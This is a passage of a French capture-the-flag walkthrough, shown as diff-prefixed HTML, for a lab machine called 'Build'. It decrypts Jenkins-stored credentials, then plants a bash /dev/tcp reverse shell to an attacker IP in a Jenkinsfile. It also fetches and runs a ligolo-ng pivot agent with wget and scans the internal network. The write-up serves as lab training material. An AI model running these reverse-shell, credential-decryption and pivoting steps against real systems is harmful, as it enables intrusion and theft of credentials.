+</span></span><span class="line"><span class="cl">  &lt;disableRememberMe&gt;false&lt;/disableRememberMe&gt;
+</span></span><span class="line"><span class="cl">  &lt;projectNamingStrategy <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;jenkins.model.ProjectNamingStrategy</span><span class="nv">$DefaultProjectNamingStrategy</span><span class="s2">&#34;</span>/&gt;
+</span></span><span class="line"><span class="cl">  &lt;workspaceDir&gt;<span class="si">${</span><span class="nv">JENKINS_HOME</span><span class="si">}</span>/workspace/<span class="si">${</span><span class="nv">ITEM_FULL_NAME</span><span class="si">}</span>&lt;/workspaceDir&gt;
+</span></span><span class="line"><span class="cl">  &lt;buildsDir&gt;<span class="si">${</span><span class="nv">ITEM_ROOTDIR</span><span class="si">}</span>/builds&lt;/buildsDir&gt;
+</span></span><span class="line"><span class="cl">  &lt;jdks/&gt;
+</span></span><span class="line"><span class="cl">  &lt;viewsTabBar <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;hudson.views.DefaultViewsTabBar&#34;</span>/&gt;
+</span></span><span class="line"><span class="cl">  &lt;myViewsTabBar <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;hudson.views.DefaultMyViewsTabBar&#34;</span>/&gt;
+</span></span><span class="line"><span class="cl">  &lt;clouds/&gt;
+</span></span><span class="line"><span class="cl">  &lt;quietPeriod&gt;5&lt;/quietPeriod&gt;
+</span></span><span class="line"><span class="cl">  &lt;scmCheckoutRetryCount&gt;0&lt;/scmCheckoutRetryCount&gt;
+</span></span><span class="line"><span class="cl">  &lt;views&gt;
+</span></span><span class="line"><span class="cl">    &lt;hudson.model.AllView&gt;
+</span></span><span class="line"><span class="cl">      &lt;owner <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;hudson&#34;</span> <span class="nv">reference</span><span class="o">=</span><span class="s2">&#34;../../..&#34;</span>/&gt;
+</span></span><span class="line"><span class="cl">      &lt;name&gt;all&lt;/name&gt;
+</span></span><span class="line"><span class="cl">      &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;
+</span></span><span class="line"><span class="cl">      &lt;filterQueue&gt;false&lt;/filterQueue&gt;
+</span></span><span class="line"><span class="cl">      &lt;properties <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;hudson.model.View</span><span class="nv">$PropertyList</span><span class="s2">&#34;</span>/&gt;
+</span></span><span class="line"><span class="cl">    &lt;/hudson.model.AllView&gt;
+</span></span><span class="line"><span class="cl">  &lt;/views&gt;
+</span></span><span class="line"><span class="cl">  &lt;primaryView&gt;all&lt;/primaryView&gt;
+</span></span><span class="line"><span class="cl">  &lt;slaveAgentPort&gt;50000&lt;/slaveAgentPort&gt;
+</span></span><span class="line"><span class="cl">  &lt;label&gt;&lt;/label&gt;
+</span></span><span class="line"><span class="cl">  &lt;crumbIssuer <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;hudson.security.csrf.DefaultCrumbIssuer&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">    &lt;excludeClientIPFromCrumb&gt;false&lt;/excludeClientIPFromCrumb&gt;
+</span></span><span class="line"><span class="cl">  &lt;/crumbIssuer&gt;
+</span></span><span class="line"><span class="cl">  &lt;nodeProperties/&gt;
+</span></span><span class="line"><span class="cl">  &lt;globalNodeProperties/&gt;
+</span></span><span class="line"><span class="cl">  &lt;nodeRenameMigrationNeeded&gt;false&lt;/nodeRenameMigrationNeeded&gt;
+</span></span><span class="line"><span class="cl">&lt;/hudson&gt;#</span></span></code></pre></div></div>
+<p>En énumérant, je trouve le fichier <code>jenkins_configuration/jobs/build/config.xml</code> qui contient les identifiants chiffrés des utilisateurs. Je trouve aussi les fichiers <code>jenkins_configuration/secrets/master.key</code> et <code>jenkins_configuration/secrets/hudson.util.Secret</code> qui permettent de déchiffrer le fichier <code>config.xml</code> avec l&rsquo;outil <a href="https://github.com/hoto/jenkins-credentials-decryptor" target="_blank" rel="noopener noreffer ">Jenkins-credentials-decryptor</a>. Voici la commande pour le télécharger.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl -L <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="s2">&#34;https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.2/jenkins-credentials-decryptor_1.2.2_</span><span class="k">$(</span>uname -s<span class="k">)</span><span class="s2">_</span><span class="k">$(</span>uname -m<span class="k">)</span><span class="s2">&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">   -o jenkins-credentials-decryptor
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">chmod +x jenkins-credentials-decryptor</span></span></code></pre></div></div>
+<p>J&rsquo;utilise alors l&rsquo;outils et je trouve les identifiants de l&rsquo;utilisateur <code>buildadm</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/workspace/Build/backups
+</span></span><span class="line"><span class="cl">❯ ./jenkins-credentials-decryptor -m jenkins_configuration/secrets/master.key -s jenkins_configuration/secrets/hudson.util.Secret -c jenkins_configuration/jobs/build/config.xml
+</span></span><span class="line"><span class="cl"><span class="o">[</span>
+</span></span><span class="line"><span class="cl">  <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;id&#34;</span>: <span class="s2">&#34;e4048737-7acd-46fd-86ef-a3db45683d4f&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span>: <span class="s2">&#34;Git1234!&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span>: <span class="s2">&#34;buildadm&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">]</span></span></span></code></pre></div></div>
+<p>Malheureusement, ils ne permettent pas une connexion ssh à la machine.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/workspace/Build
+</span></span><span class="line"><span class="cl">❯ nxc ssh 10.129.234.169 -u buildadm -p <span class="s1">&#39;Git1234!&#39;</span>
+</span></span><span class="line"><span class="cl">SSH         10.129.234.169  <span class="m">22</span>     10.129.234.169   <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
+</span></span><span class="line"><span class="cl">SSH         10.129.234.169  <span class="m">22</span>     10.129.234.169   <span class="o">[</span>-<span class="o">]</span> buildadm:Git1234!</span></span></code></pre></div></div>
+<h2 id="connexion-à-gitea">Connexion à Gitea</h2>
+<p>Par contre, ce sont les identifiants Gitea valides.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Build/Build-5.png"
+        data-srcset="/images/Build/Build-5.png, /images/Build/Build-5.png 1.5x, /images/Build/Build-5.png 2x"
+        data-sizes="auto"
+        alt="/images/Build/Build-5.png"
+        title="/images/Build/Build-5.png" width="1296" height="419" /></p>
+<h2 id="reverse-shell">Reverse shell</h2>
+<p>Je peux maintenant modifier le fichier Jenkins se trouvant dans le repo dev permettant d&rsquo;exécuter des commandes systèmes. Je remplace donc le contenu du script avec une commande reverse shell basique et j&rsquo;enregistre le fichier</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.16.48/9001 0&gt;&amp;1&#34;</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Build/Build-6.png"
+        data-srcset="/images/Build/Build-6.png, /images/Build/Build-6.png 1.5x, /images/Build/Build-6.png 2x"
+        data-sizes="auto"
+        alt="/images/Build/Build-6.png"
+        title="/images/Build/Build-6.png" width="1336" height="337" /></p>
+<p>Avant l&rsquo;enregistrement du fichier, j&rsquo;ai démarré mon listener. Donc après enregistrement du fichier, quelques secondes plus tard, j&rsquo;obtiens un reverse shell en tant que root sur un docker.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Build/Build-7.png"
+        data-srcset="/images/Build/Build-7.png, /images/Build/Build-7.png 1.5x, /images/Build/Build-7.png 2x"
+        data-sizes="auto"
+        alt="/images/Build/Build-7.png"
+        title="/images/Build/Build-7.png" width="1344" height="494" /></p>
+<p>Je peux alors récupérer le 1er flag.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@5ac6c7d6fb8e:~# ls
+</span></span><span class="line"><span class="cl">user.txt
+</span></span><span class="line"><span class="cl">root@5ac6c7d6fb8e:~# cat user.txt
+</span></span><span class="line"><span class="cl">466*****************************</span></span></code></pre></div></div>
+<h1 id="shell-en-tant-que-root">Shell en tant que root</h1>
+<h2 id="énumération-1">Énumération</h2>
+<p>J&rsquo;énumère alors le réseau de la machine. La commande <code>ping</code> n&rsquo;étant pas installée sur la machine, je vais faire du pivoting pour accéder au réseau interne.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@5ac6c7d6fb8e:/tmp# cat /etc/hosts
+</span></span><span class="line"><span class="cl">127.0.0.1       localhost
+</span></span><span class="line"><span class="cl">::1     localhost ip6-localhost ip6-loopback
+</span></span><span class="line"><span class="cl">fe00::0 ip6-localnet
+</span></span><span class="line"><span class="cl">ff00::0 ip6-mcastprefix
+</span></span><span class="line"><span class="cl">ff02::1 ip6-allnodes
+</span></span><span class="line"><span class="cl">ff02::2 ip6-allrouters
+</span></span><span class="line"><span class="cl">172.18.0.3      5ac6c7d6fb8e</span></span></code></pre></div></div>
+<p>Sur ma machine je démarre le serveur ligolo-ng.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ligolo-ng -selfcert</span></span></code></pre></div></div>
+<p>J&rsquo;uploade alors un agent ligolo-ng pour le pivoting.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget 10.10.16.48/agent -O /tmp/agent
+</span></span><span class="line"><span class="cl">chmod +x /tmp/agent
+</span></span><span class="line"><span class="cl">/tmp/agent -ignore-cert -connect 10.10.16.48:11601 <span class="p">&amp;</span></span></span></code></pre></div></div>
+<p>Une fois la connexion établie avec le serveur, j&rsquo;execute la commande <code>session</code> afin de choisir la session établie. Puis je peux exécuter la commande <code>autoroute</code> et suivre les étapes de création du tunnel. Sinon je peux les faire manuellement avec les commandes suivantes.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ifcreate --name build
+</span></span><span class="line"><span class="cl">route_add --name build --route 172.18.0.0/24
+</span></span><span class="line"><span class="cl">tunnel_start --tun build</span></span></code></pre></div></div>
+<p>Je faire alors du ping sweep et je trouve 5 autres machines.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/workspace/Build
+</span></span><span class="line"><span class="cl">❯ <span class="k">for</span> i in <span class="o">{</span>1..254<span class="o">}</span> <span class="p">;</span><span class="k">do</span> <span class="o">(</span>ping -c <span class="m">1</span> 172.18.0.<span class="nv">$i</span> <span class="p">|</span> grep <span class="s2">&#34;bytes from&#34;</span> <span class="p">&amp;</span><span class="o">)</span> <span class="p">;</span><span class="k">done</span>
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 172.18.0.1: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">64</span> <span class="nv">time</span><span class="o">=</span>35.7 ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 172.18.0.2: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">64</span> <span class="nv">time</span><span class="o">=</span>33.4 ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 172.18.0.6: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">64</span> <span class="nv">time</span><span class="o">=</span>57.5 ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 172.18.0.4: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">64</span> <span class="nv">time</span><span class="o">=</span>63.1 ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 172.18.0.3: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">64</span> <span class="nv">time</span><span class="o">=</span>65.9 ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 172.18.0.5: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">64</span> <span class="nv">time</span><span class="o">=</span>60.3 ms</span></span></code></pre></div></div>
+<p>Je mets les adresses IP dans un fichier <strong>hosts.txt</strong> et je lance un scan <strong>nmap</strong>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nmap -iL hosts.txt --vv</span></span></code></pre></div></div>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 172.18.0.1
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE         REASON
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh             syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">53/tcp   open  domain          syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">512/tcp  open  <span class="nb">exec</span>            syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">513/tcp  open  login           syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">514/tcp  open  shell           syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">873/tcp  open  rsync           syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">3000/tcp open  ppp             syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">3306/tcp open  mysql           syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">8081/tcp open  blackice-icecap syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 172.18.0.2
+</span></span><span class="line"><span class="cl">Host is up, received reset ttl <span class="m">64</span> <span class="o">(</span>0.054s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-12-07 20:56:12 CET <span class="k">for</span> 3s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE REASON
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">3000/tcp open  ppp     syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 172.18.0.6
+</span></span><span class="line"><span class="cl">Host is up, received reset ttl <span class="m">64</span> <span class="o">(</span>0.081s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-12-07 20:56:12 CET <span class="k">for</span> 3s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">999</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 172.18.0.4
+</span></span><span class="line"><span class="cl">Host is up, received reset ttl <span class="m">64</span> <span class="o">(</span>0.061s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-12-07 20:56:12 CET <span class="k">for</span> 3s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">999</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE REASON
+</span></span><span class="line"><span class="cl">3306/tcp open  mysql   syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 172.18.0.3
+</span></span><span class="line"><span class="cl">Host is up, received reset ttl <span class="m">64</span> <span class="o">(</span>0.065s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-12-07 20:56:12 CET <span class="k">for</span> 3s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE    REASON
+</span></span><span class="line"><span class="cl">8080/tcp  open  http-proxy syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">50000/tcp open  ibm-db2    syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 172.18.0.5
+</span></span><span class="line"><span class="cl">Host is up, received reset ttl <span class="m">64</span> <span class="o">(</span>0.096s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-12-07 20:56:12 CET <span class="k">for</span> 3s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE         REASON
+</span></span><span class="line"><span class="cl">53/tcp   open  domain          syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">8081/tcp open  blackice-icecap syn-ack ttl <span class="m">64</span></span></span></code></pre></div></div>
+<h2 id="connexion-mysql">Connexion MySQL</h2>
+<p>Je me connecte à MySQL sur la machine <strong>172.18.0.1</strong>. Je trouve la base de données <code>powerdnsadmin</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/workspace/Build   9s
+</span></span><span class="line"><span class="cl">❯ mysql -u root -h 172.18.0.1 -p
+</span></span><span class="line"><span class="cl">Enter password:
+</span></span><span class="line"><span class="cl">Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
+</span></span><span class="line"><span class="cl">Your MariaDB connection id is <span class="m">42</span>
+</span></span><span class="line"><span class="cl">Server version: 11.3.2-MariaDB-1:11.3.2+maria~ubu2204 mariadb.org binary distribution
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[(</span>none<span class="o">)]</span>&gt; show databases<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Database           <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> information_schema <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> mysql              <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> performance_schema <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> powerdnsadmin      <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> sys                <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------+</span></span></code></pre></div></div>
+<p>La table <code>user</code> contient le mot de passe chiffrer de l&rsquo;utilisateur <code>admin</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">MariaDB <span class="o">[(</span>none<span class="o">)]</span>&gt; use powerdnsadmin
+</span></span><span class="line"><span class="cl">Reading table information <span class="k">for</span> completion of table and column names
+</span></span><span class="line"><span class="cl">You can turn off this feature to get a quicker startup with -A
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Database changed
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>powerdnsadmin<span class="o">]</span>&gt; show tables<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+-------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Tables_in_powerdnsadmin <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> account                 <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> account_user            <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> alembic_version         <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> apikey                  <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> apikey_account          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> comments                <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> cryptokeys              <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> domain                  <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> domain_apikey           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> domain_setting          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> domain_template         <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> domain_template_record  <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> domain_user             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> domainmetadata          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> domains                 <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="nb">history</span>                 <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> records                 <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> role                    <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> sessions                <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> setting                 <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> supermasters            <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tsigkeys                <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> user                    <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------------------+
+</span></span><span class="line"><span class="cl"><span class="m">23</span> rows in <span class="nb">set</span> <span class="o">(</span>0.083 sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>powerdnsadmin<span class="o">]</span>&gt; describe user<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+------------+--------------+------+-----+---------+----------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Field      <span class="p">|</span> Type         <span class="p">|</span> Null <span class="p">|</span> Key <span class="p">|</span> Default <span class="p">|</span> Extra          <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------+--------------+------+-----+---------+----------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> id         <span class="p">|</span> int<span class="o">(</span>11<span class="o">)</span>      <span class="p">|</span> NO   <span class="p">|</span> PRI <span class="p">|</span> NULL    <span class="p">|</span> auto_increment <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> username   <span class="p">|</span> varchar<span class="o">(</span>64<span class="o">)</span>  <span class="p">|</span> YES  <span class="p">|</span> UNI <span class="p">|</span> NULL    <span class="p">|</span>                <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> password   <span class="p">|</span> varchar<span class="o">(</span>64<span class="o">)</span>  <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> NULL    <span class="p">|</span>                <span class="p">|</span>
